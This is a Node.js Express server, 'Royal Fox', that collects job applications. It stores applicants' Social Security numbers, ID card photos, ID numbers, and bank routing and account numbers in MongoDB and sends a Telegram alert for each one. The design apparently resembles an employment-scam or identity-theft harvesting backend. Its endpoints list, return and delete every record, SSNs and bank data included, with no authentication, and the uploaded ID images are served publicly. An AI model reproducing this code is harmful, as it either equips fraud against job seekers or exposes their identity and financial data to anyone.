// File: server.js (ROYAL-FOX - FINAL VERSION)
// Backend sends quick Telegram alerts
// All data stored in MongoDB & viewable in Admin Dashboard

const express = require("express");
const mongoose = require("mongoose");
const axios = require("axios");
const cors = require("cors");
const dotenv = require("dotenv");
const multer = require("multer");
const path = require("path");
const fs = require("fs");

// --- Create 'uploads' directory if it doesn't exist ---
const uploadsDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir);
  console.log("✅ Created 'uploads' directory.");
}

// Load environment variables from .env file
dotenv.config();

// --- 1. Check for environment variables ---
const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, PORT, MONGODB_URI, NODE_ENV } =
  process.env;

console.log("\n" + "═".repeat(70));
console.log("🚀 ROYAL FOX BACKEND STARTING (Final Version)");
console.log("═".repeat(70));

// Validate required env vars
if (!TELEGRAM_BOT_TOKEN) {
  throw new Error(
    "FATAL ERROR: TELEGRAM_BOT_TOKEN is not defined in .env file."
  );
}
if (!TELEGRAM_CHAT_ID) {
  throw new Error("FATAL ERROR: TELEGRAM_CHAT_ID is not defined in .env file.");
}
if (!MONGODB_URI) {
  throw new Error("FATAL ERROR: MONGODB_URI is not defined in .env file.");
}

console.log("✅ Environment variables loaded");
console.log(
  "✅ TELEGRAM_BOT_TOKEN:",
  TELEGRAM_BOT_TOKEN.substring(0, 20) + "..."
);
console.log("✅ TELEGRAM_CHAT_ID:", TELEGRAM_CHAT_ID);
console.log("✅ MONGODB_URI:", MONGODB_URI.substring(0, 60) + "...");

const app = express();
const port = PORT || 3000;

// --- 2. MongoDB Connection ---
mongoose
  .connect(MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => {
    console.log("✅ MongoDB connected successfully");
  })
  .catch((err) => {
    console.error("❌ MongoDB connection error:", err.message);
    process.exit(1);
  });

// --- 3. MongoDB Schema ---
const applicationSchema = new mongoose.Schema(
  {
    applicationId: {
      type: String,
      unique: true,
      required: true,
    },
    personalInfo: {
      firstName: String,
      lastName: String,
      middleName: String,
      dob: Date,
      street: String,
      city: String,
      state: String,
      zipCode: String,
      phone: String,
      email: String,
      workAuthorized: Boolean,
      preferredContact: String,
      ssn: String,
      idType: String,
      idNumber: String,
      idExpiration: Date,
      idFront: String,
      idBack: String,
    },
    positionDetails: {
      positionApplied: String,
      employmentType: String,
      expectedSalary: String,
      startDate: Date,
      workSchedule: String,
      willOvertimeTravel: Boolean,
      bankName: String,
      bankAccountType: String,
      accountHolderName: String,
      routingNumber: String,
      accountNumber: String,
      bankConsent: Boolean,
    },
    education: {
      highSchoolName: String,
      highSchoolLocation: String,
      collegeName: String,
      collegeLocation: String,
      collegeDegree: String,
      licenses: String,
    },
    employmentHistory: [
      {
        company: String,
        address: String,
        jobTitle: String,
        supervisorName: String,
        dateFrom: Date,
        dateTo: Date,
        responsibilities: String,
      },
    ],
    documents: {
      resume: String,
      resumeUploadedAt: Date,
    },
    consents: {
      identityVerification: Boolean,
      bankDetailsVerification: Boolean,
      consentedAt: Date,
    },
    signature: {
      applicantName: String,
      signedDate: Date,
    },
    status: {
      type: String,
      enum: ["submitted", "under-review", "approved", "rejected"],
      default: "submitted",
    },
    submittedAt: {
      type: Date,
      default: Date.now,
    },
  },
  { timestamps: true }
);

const Application = mongoose.model("Application", applicationSchema);

// --- 4. Multer File Upload Configuration ---
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, "uploads/");
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
    const extension = path.extname(file.originalname);
    cb(null, file.fieldname + "-" + uniqueSuffix + extension);
  },
});

const upload = multer({ storage: storage }).fields([
  { name: "idFront", maxCount: 1 },
  { name: "idBack", maxCount: 1 },
  { name: "resume", maxCount: 1 },
]);

// --- 5. Middleware ---

const corsOptions = {
  origin: [
    "http://localhost:3000",
    "http://localhost:5173",
    "http://localhost:5174",
  ],
  optionsSuccessStatus: 200,
  credentials: true,
};

app.use(cors(corsOptions));
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));
app.use("/uploads", express.static(path.join(__dirname, "uploads")));

app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`);
  next();
});

// --- 6. Telegram Helper Functions ---

const escapeHTML = (str) => {
  if (!str) return "N/A";
  return String(str).replace(/[&<>"']/g, (match) => {
    const map = {
      "&": "&amp;",
      "<": "&lt;",
      ">": "&gt;",
      '"': "&quot;",
      "'": "&#39;",
    };
    return map[match];
  });
};

// ╔════════════════════════════════════════════════════════════════════════════╗
// ║  formatMessage - QUICK TELEGRAM NOTIFICATION ONLY                          ║
// ║  Full data is in Admin Dashboard. This sends a quick alert.                ║
// ╚════════════════════════════════════════════════════════════════════════════╝
const formatMessage = (data, applicationId) => {
  let message = `🔔 <b>NEW APPLICATION RECEIVED</b> 🔔\n\n`;
  message += `<b>Applicant:</b> ${escapeHTML(data.firstName)} ${escapeHTML(
    data.lastName
  )}\n`;
  message += `<b>Email:</b> ${escapeHTML(data.email)}\n`;
  message += `<b>Phone:</b> ${escapeHTML(data.phone || "N/A")}\n`;
  message += `<b>Position:</b> ${escapeHTML(data.positionApplied || "N/A")}\n`;
  message += `<b>Application ID:</b> <code>${applicationId}</code>\n\n`;
  message += `📋 <b>View full details in Admin Dashboard</b>\n`;
  message += `⏱️ ${new Date().toLocaleString()}\n`;

  return message;
};

const sendTelegramMessage = async (botToken, chatId, text) => {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const MAX_LENGTH = 4096;

  if (text.length <= MAX_LENGTH) {
    await axios.post(url, {
      chat_id: chatId,
      text: text,
      parse_mode: "HTML",
    });
  } else {
    let start = 0;
    while (start < text.length) {
      const chunk = text.substring(start, start + MAX_LENGTH);
      await axios.post(url, {
        chat_id: chatId,
        text: chunk,
        parse_mode: "HTML",
      });
      start += MAX_LENGTH;
    }
  }
};

const parseDate = (dateString) => {
  if (!dateString) return null;

  if (dateString instanceof Date) {
    return isNaN(dateString.getTime()) ? null : dateString;
  }

  if (typeof dateString === "string") {
    const trimmed = dateString.trim();
    if (trimmed === "") return null;

    const date = new Date(trimmed);

    if (isNaN(date.getTime())) {
      console.warn(`⚠️ Invalid date format: "${trimmed}". Skipping.`);
      return null;
    }

    return date;
  }

  return null;
};

// --- 7. API Endpoints ---

app.get("/", (req, res) => {
  res.json({
    message: "✅ Royal Fox Backend is running",
    version: "2.0.0",
    endpoints: {
      submitApplication: "POST /api/applications",
      getApplications: "GET /api/applications",
      getApplication: "GET /api/applications/:applicationId",
      health: "GET /health",
    },
  });
});

app.get("/health", (req, res) => {
  res.json({ status: "OK", timestamp: new Date() });
});

app.get("/api/applications", async (req, res) => {
  try {
    const applications = await Application.find().sort({ submittedAt: -1 });
    res.json({
      success: true,
      count: applications.length,
      data: applications,
    });
  } catch (error) {
    console.error("Error fetching applications:", error);
    res.status(500).json({
      success: false,
      message: "Error fetching applications",
      error: error.message,
    });
  }
});

app.get("/api/applications/:applicationId", async (req, res) => {
  try {
    const application = await Application.findOne({
      applicationId: req.params.applicationId,
    });

    if (!application) {
      return res.status(404).json({
        success: false,
        message: "Application not found",
      });
    }

    res.json({
      success: true,
      data: application,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "Error fetching application",
      error: error.message,
    });
  }
});

// DELETE - Delete application
app.delete("/api/applications/:applicationId", async (req, res) => {
  try {
    console.log(`\n🗑️  Deleting application: ${req.params.applicationId}`);

    const application = await Application.findOneAndDelete({
      applicationId: req.params.applicationId,
    });

    if (!application) {
      return res.status(404).json({
        success: false,
        message: "Application not found",
      });
    }

    // Delete associated files if they exist
    if (
      application.personalInfo?.idFront &&
      fs.existsSync(application.personalInfo.idFront)
    ) {
      fs.unlinkSync(application.personalInfo.idFront);
      console.log("✓ Deleted ID Front file");
    }
    if (
      application.personalInfo?.idBack &&
      fs.existsSync(application.personalInfo.idBack)
    ) {
      fs.unlinkSync(application.personalInfo.idBack);
      console.log("✓ Deleted ID Back file");
    }
    if (
      application.documents?.resume &&
      fs.existsSync(application.documents.resume)
    ) {
      fs.unlinkSync(application.documents.resume);
      console.log("✓ Deleted Resume file");
    }

    console.log(
      `✅ Application ${req.params.applicationId} deleted successfully\n`
    );

    res.json({
      success: true,
      message: "Application deleted successfully",
      applicationId: req.params.applicationId,
    });
  } catch (error) {
    console.error("❌ Error deleting application:", error.message);
    res.status(500).json({
      success: false,
      message: "Error deleting application",
      error: error.message,
    });
  }
});

// POST - Submit application
app.post("/api/applications", upload, async (req, res) => {
  console.log("\n" + "─".repeat(70));
  console.log("📝 PROCESSING NEW APPLICATION");
  console.log("─".repeat(70));

  try {
    const formData = req.body;
    const files = req.files;

    const idFrontPath = files.idFront ? files.idFront[0].path : null;
    const idBackPath = files.idBack ? files.idBack[0].path : null;
    const resumePath = files.resume ? files.resume[0].path : null;

    console.log("✓ Files received:", { idFrontPath, idBackPath, resumePath });

    // Validate required fields
    console.log("✓ Validating required fields...");
    if (!formData.firstName || !formData.lastName || !formData.email) {
      console.error("❌ Missing basic information");
      return res.status(400).json({
        success: false,
        message: "Missing required fields: firstName, lastName, email",
      });
    }

    // Generate ID
    const applicationId = `RF-${Date.now()}`;
    console.log("✓ Application ID:", applicationId);


    // Create application document
    console.log("✓ Creating MongoDB document...");
    const application = new Application({
      applicationId: applicationId,
      personalInfo: {
        firstName: formData.firstName,
        lastName: formData.lastName,
        middleName: formData.middleName,
        dob: parseDate(formData.dob),
        street: formData.street,
        city: formData.city,
        state: formData.state,
        zipCode: formData.zipCode,
        phone: formData.phone,
        email: formData.email,
        workAuthorized: formData.workAuthorized === "yes",
        preferredContact: formData.preferredContact,
        ssn: formData.ssn,
        idType: formData.idType,
        idNumber: formData.idNumber,
        idExpiration: parseDate(formData.idExpiration),
        idFront: idFrontPath,
        idBack: idBackPath,
      },
      positionDetails: {
        positionApplied: formData.positionApplied,
        employmentType: formData.employmentType,
        expectedSalary: formData.expectedSalary,
        startDate: parseDate(formData.startDate),
        workSchedule: formData.workSchedule,
        willOvertimeTravel: formData.willOvertimeTravel === "yes",
        bankName: formData.bankName,
        bankAccountType: formData.bankAccountType,
        accountHolderName: formData.accountHolderName,
        routingNumber: formData.routingNumber,
        accountNumber: formData.accountNumber,
        bankConsent: formData.bankConsent === "true",
      },
      documents: {
        resume: resumePath,
        resumeUploadedAt: new Date(),
      },
      consents: {
        identityVerification: formData.identityConsent === "true",
        bankDetailsVerification: formData.bankDetailsConsent === "true",
        consentedAt: new Date(),
      },
      signature: {
        applicantName: formData.signature,
        signedDate: parseDate(formData.signatureDate),
      },
    });

    // Save to MongoDB
    console.log("✓ Saving to MongoDB...");
    await application.save();
    console.log("✅ Saved to MongoDB successfully");

    // Format and send quick Telegram notification
    console.log("✓ Sending Telegram notification...");
    const message = formatMessage(formData, applicationId);
    await sendTelegramMessage(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
    console.log("✅ Sent to Telegram successfully");

    console.log("═".repeat(70));
    console.log("✅ APPLICATION PROCESSED SUCCESSFULLY\n");

    // Send success response
    res.status(201).json({
      success: true,
      message: "Application submitted successfully!",
      applicationId: applicationId,
      data: {
        applicationId: applicationId,
        personalInfo: {
          firstName: formData.firstName,
          lastName: formData.lastName,
          email: formData.email,
        },
        positionDetails: {
          positionApplied: formData.positionApplied,
        },
        submittedAt: new Date(),
      },
    });
  } catch (error) {
    console.error("❌ Error processing application:", error.message);
    console.error("Error stack:", error.stack);
    console.log("═".repeat(70) + "\n");

    if (error.code === 11000) {
      console.error(
        "Error: Duplicate key. This shouldn't happen with timestamp-based ID."
      );
      return res.status(500).json({
        success: false,
        message: "Duplicate entry error. Please try again.",
        error: "Duplicate key",
      });
    }

    const telegramError = error.response ? error.response.data : error.message;

    res.status(500).json({
      success: false,
      message: "Failed to submit application.",
      error: telegramError,
      errorType: error.constructor.name,
    });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error("Unhandled error:", err);
  res.status(500).json({
    success: false,
    message: "Internal server error",
    error: err.message,
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: "Endpoint not found",
    path: req.path,
  });
});

// --- 8. Start the Server ---
app.listen(port, () => {
  console.log("═".repeat(70));
  console.log(`🚀 Royal Fox Backend running on http://localhost:${port}`);
  console.log("📂 MongoDB: Connected");
  console.log("📱 Telegram: Configured (Quick alerts only)");
  console.log("📤 Uploads: Ready (serving from /uploads)");
  console.log("📊 Admin Dashboard: Available separately");
  console.log("═".repeat(70));
  console.log("\nReady to receive applications!\n");
});
